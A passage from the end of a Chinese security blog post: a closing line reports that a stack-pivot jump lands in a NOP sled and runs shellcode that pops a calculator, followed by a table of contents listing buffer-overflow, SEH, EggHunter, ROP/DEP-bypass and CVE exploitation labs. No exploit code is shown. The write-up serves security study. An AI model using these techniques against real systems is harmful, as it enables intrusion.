<p>stackpivot 生成了这个 jmp 指令直接跳到了 <code>004121de</code>  后面 200 个滑板字节 <code>\x90</code>  中，然后执行了后面的 shellcode，成功弹出计算器</p>
<p><img src="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20241231165103998.png" alt="image-20241231165103998"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://robe1t.github.io">robe1t</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://robe1t.github.io/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/">https://robe1t.github.io/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://robe1t.github.io" target="_blank">welcome2小神龙俱乐部</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/me.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer=""></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/11/19/NewstarCTF2024-wp/" title="NewstarCTF2024 wp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">NewstarCTF2024 wp</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">We1comeeeeee</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text"> 逆向分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%92%88%E5%AF%B9pe%E6%96%87%E4%BB%B6%E7%9A%84%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.</span> <span class="toc-text"> 针对 PE 文件的代码注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.1.</span> <span class="toc-text"> 实验介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B"><span class="toc-number">1.1.2.</span> <span class="toc-text"> 实验过程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E8%B7%B3%E8%BD%AC"><span class="toc-number">1.1.2.1.</span> <span class="toc-text"> 程序跳转</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8F%E5%85%A5%E5%8F%A3%E7%82%B9"><span class="toc-number">1.1.2.2.</span> <span class="toc-text"> 修改程序入口点</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cve-2013-4730%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.2.</span> <span class="toc-text"> CVE-2013-4730 漏洞利用复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A1%AE%E8%AE%A4shellcode%E7%A9%BA%E9%97%B4%E5%92%8Ceip%E6%8C%87%E4%BB%A4%E7%9A%84%E5%9C%B0%E5%9D%80"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 确认 Shellcode 空间和 EIP 指令的地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E5%8F%AF%E7%94%A8%E7%9A%84shellcode%E7%A9%BA%E9%97%B4"><span class="toc-number">1.2.2.</span> <span class="toc-text"> 确定可用的 Shellcode 空间</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E5%94%AF%E4%B8%80%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%9D%A5%E5%AE%9A%E4%BD%8Deip%E6%BA%A2%E5%87%BA%E5%9C%B0%E5%9D%80"><span class="toc-number">1.2.3.</span> <span class="toc-text"> 基于唯一字符串来定位 EIP 溢出地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A1%AE%E8%AE%A4%E5%9D%8F%E5%AD%97%E8%8A%82"><span class="toc-number">1.2.4.</span> <span class="toc-text"> 确认坏字节</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E8%B7%B3%E8%BD%AC%E6%8C%87%E4%BB%A4"><span class="toc-number">1.2.5.</span> <span class="toc-text"> 寻找跳转指令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E5%86%99shellcode"><span class="toc-number">1.2.6.</span> <span class="toc-text"> 编写 shellcode</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#vulnserverexe%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.</span> <span class="toc-text">  VulnServer.exe  的漏洞挖掘分析与利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A1%AE%E8%AE%A4shellcode%E7%A9%BA%E9%97%B4%E5%92%8Ceip%E6%8C%87%E4%BB%A4%E5%9C%B0%E5%9D%80"><span class="toc-number">1.3.1.</span> <span class="toc-text"> 确认 shellcode 空间和 EIP 指令地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BEeip%E6%BA%A2%E5%87%BA%E6%97%B6%E7%9A%84%E5%86%85%E5%AD%98%E5%9C%B0%E5%9D%80"><span class="toc-number">1.3.2.</span> <span class="toc-text"> 寻找 EIP 溢出时的内存地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%89%BEjmp-esp-%E6%8C%87%E4%BB%A4"><span class="toc-number">1.3.3.</span> <span class="toc-text"> 查找 jmp esp 指令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A1%AE%E8%AE%A4%E5%9D%8F%E5%AD%97%E8%8A%82-2"><span class="toc-number">1.3.4.</span> <span class="toc-text"> 确认坏字节</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E5%86%99shellcode-2"><span class="toc-number">1.3.5.</span> <span class="toc-text"> 编写 shellcode</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8Ffuzz%E5%8F%8Aseh%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.</span> <span class="toc-text"> 基于文件格式 Fuzz 及 SEH 漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E4%BB%8B%E7%BB%8D%E5%AE%9E%E8%B7%B5%E5%86%85%E5%AE%B9"><span class="toc-number">1.4.1.</span> <span class="toc-text"> 实验介绍实践内容</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.4.2.</span> <span class="toc-text"> 触发漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BApoc"><span class="toc-number">1.4.3.</span> <span class="toc-text"> 创建 POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%9F%AD%E8%B7%B3%E6%8A%80%E6%9C%AF%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B"><span class="toc-number">1.4.4.</span> <span class="toc-text"> 利用短跳技术控制程序执行流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#seh%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.5.</span> <span class="toc-text"> SEH 利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9D%8F%E5%AD%97%E8%8A%82%E5%88%86%E6%9E%90"><span class="toc-number">1.4.6.</span> <span class="toc-text"> 坏字节分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E5%86%99shellcode-3"><span class="toc-number">1.4.7.</span> <span class="toc-text"> 编写 shellcode</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8Eegghunter-%E5%AF%BB%E8%9B%8B%E7%8C%8E%E4%BA%BA%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="toc-number">1.5.</span> <span class="toc-text"> 基于 EggHunter 寻蛋猎人的漏洞分析与利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91%E6%BC%8F%E6%B4%9E-2"><span class="toc-number">1.5.1.</span> <span class="toc-text"> 触发漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E5%BB%BApoc"><span class="toc-number">1.5.2.</span> <span class="toc-text"> 构建 POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E4%BD%8D%E5%81%8F%E7%A7%BB"><span class="toc-number">1.5.3.</span> <span class="toc-text"> 定位偏移</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9D%8F%E5%AD%97%E8%8A%82%E5%88%86%E6%9E%90-2"><span class="toc-number">1.5.4.</span> <span class="toc-text"> 坏字节分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8Eegghunter%E5%AE%9E%E7%8E%B0%E7%A8%8B%E5%BA%8F%E6%8E%A7%E5%88%B6%E6%B5%81%E7%A8%8B%E5%8A%AB%E6%8C%81"><span class="toc-number">1.5.5.</span> <span class="toc-text"> 基于 EggHunter  实现程序控制流程劫持</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E6%89%BEjmp-esp-%E6%8C%87%E4%BB%A4-2"><span class="toc-number">1.5.5.1.</span> <span class="toc-text"> 查找 jmp esp 指令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AE%E7%9F%AD%E8%B7%B3%E6%8C%87%E4%BB%A4"><span class="toc-number">1.5.5.2.</span> <span class="toc-text"> 设置短跳指令</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E5%86%99shellcode-4"><span class="toc-number">1.5.6.</span> <span class="toc-text"> 编写 shellcode</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E5%92%8Cunicode%E7%BC%96%E7%A0%81%E4%B8%8B%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.6.</span> <span class="toc-text"> 十六进制和 Unicode 编码下的漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91%E6%BC%8F%E6%B4%9E-3"><span class="toc-number">1.6.1.</span> <span class="toc-text"> 触发漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E9%80%A0poc%E9%AA%8C%E8%AF%81"><span class="toc-number">1.6.1.1.</span> <span class="toc-text"> 构造 poc 验证</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E4%BD%8D%E5%81%8F%E7%A7%BB%E5%AF%BB%E6%89%BEjmp-esp"><span class="toc-number">1.6.2.</span> <span class="toc-text"> 定位偏移，寻找 jmp esp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9D%8F%E5%AD%97%E8%8A%82%E5%88%86%E6%9E%90-3"><span class="toc-number">1.6.3.</span> <span class="toc-text"> 坏字节分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E5%86%99shellcode-5"><span class="toc-number">1.6.4.</span> <span class="toc-text"> 编写 shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unicode%E7%BC%96%E7%A0%81"><span class="toc-number">1.6.5.</span> <span class="toc-text"> Unicode 编码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rop-%E7%BB%95%E8%BF%87%E6%95%B0%E6%8D%AE%E6%89%A7%E8%A1%8C%E4%BF%9D%E6%8A%A4bypass-dep"><span class="toc-number">1.7.</span> <span class="toc-text"> ROP 绕过数据执行保护 (Bypass DEP)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91%E6%BC%8F%E6%B4%9E-4"><span class="toc-number">1.7.1.</span> <span class="toc-text"> 触发漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E4%BD%8D%E5%81%8F%E7%A7%BB-2"><span class="toc-number">1.7.2.</span> <span class="toc-text"> 定位偏移</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9D%8F%E5%AD%97%E8%8A%82%E5%88%86%E6%9E%90-4"><span class="toc-number">1.7.3.</span> <span class="toc-text"> 坏字节分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E8%B7%B3%E8%BD%AC%E6%8C%87%E4%BB%A4-2"><span class="toc-number">1.7.4.</span> <span class="toc-text"> 寻找跳转指令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E5%86%99shellcode-6"><span class="toc-number">1.7.5.</span> <span class="toc-text"> 编写 shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8win7%E7%B3%BB%E7%BB%9F%E5%90%AF%E5%8A%A8dep"><span class="toc-number">1.7.6.</span> <span class="toc-text"> 在 win7 系统启动 DEP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%AF%E7%94%A8dep"><span class="toc-number">1.7.6.1.</span> <span class="toc-text"> 启用 DEP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%9F%E6%88%90rop"><span class="toc-number">1.7.6.2.</span> <span class="toc-text"> 生成 ROP</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%92%88%E5%AF%B9web%E6%9C%8D%E5%8A%A1%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%AE%9E%E4%BE%8B-cve-2017-9544"><span class="toc-number">1.8.</span> <span class="toc-text"> 针对 Web 服务类型的实例 - CVE-2017-9544</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91%E6%BC%8F%E6%B4%9E-5"><span class="toc-number">1.8.1.</span> <span class="toc-text"> 触发漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E4%BD%8D%E5%81%8F%E7%A7%BB-3"><span class="toc-number">1.8.2.</span> <span class="toc-text"> 定位偏移</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E8%B7%B3%E8%BD%AC%E6%8C%87%E4%BB%A4-3"><span class="toc-number">1.8.3.</span> <span class="toc-text"> 寻找跳转指令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9D%8F%E5%AD%97%E8%8A%82%E5%88%86%E6%9E%90-5"><span class="toc-number">1.8.4.</span> <span class="toc-text"> 坏字节分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E5%86%99shellcode-7"><span class="toc-number">1.8.5.</span> <span class="toc-text"> 编写 shellcode</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%A0%88%E6%97%8B%E8%BD%AC%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E9%92%88%E5%AF%B9cve-2009-1437"><span class="toc-number">1.9.</span> <span class="toc-text"> 基于栈旋转的漏洞利用 - 针对 CVE-2009-1437</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91%E6%BC%8F%E6%B4%9E-6"><span class="toc-number">1.9.1.</span> <span class="toc-text"> 触发漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E4%BD%8D%E5%81%8F%E7%A7%BB-4"><span class="toc-number">1.9.2.</span> <span class="toc-text"> 定位偏移</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E8%B7%B3%E8%BD%AC%E6%8C%87%E4%BB%A4-4"><span class="toc-number">1.9.3.</span> <span class="toc-text"> 寻找跳转指令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9D%8F%E5%AD%97%E8%8A%82%E5%88%86%E6%9E%90-6"><span class="toc-number">1.9.4.</span> <span class="toc-text"> 坏字节分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E5%86%99shellcode-8"><span class="toc-number">1.9.5.</span> <span class="toc-text"> 编写 shellcode</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/25/%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/" title="逆向分析">逆向分析</a><time datetime="2025-01-25T11:37:32.000Z" title="发表于 2025-01-25 19:37:32">2025-01-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/19/NewstarCTF2024-wp/" title="NewstarCTF2024 wp">NewstarCTF2024 wp</a><time datetime="2024-11-19T08:15:23.000Z" title="发表于 2024-11-19 16:15:23">2024-11-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/19/SHCTF2024-wp/" title="SHCTF2024 wp">SHCTF2024 wp</a><time datetime="2024-11-19T08:14:26.000Z" title="发表于 2024-11-19 16:14:26">2024-11-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/19/0xGame2024-wp/" title="0xGameCTF2024 wp">0xGameCTF2024 wp</a><time datetime="2024-11-19T08:14:26.000Z" title="发表于 2024-11-19 16:14:26">2024-11-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/09/25/hello-world/" title="hexo操作指北">hexo操作指北</a><time datetime="2024-09-24T16:30:06.889Z" title="发表于 2024-09-25 00:30:06">2024-09-25</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">©2020 - 2025 By robe1t</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="/js/tw_cn.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/fireworks.min.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="true"></script><script async="" data-pjax="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>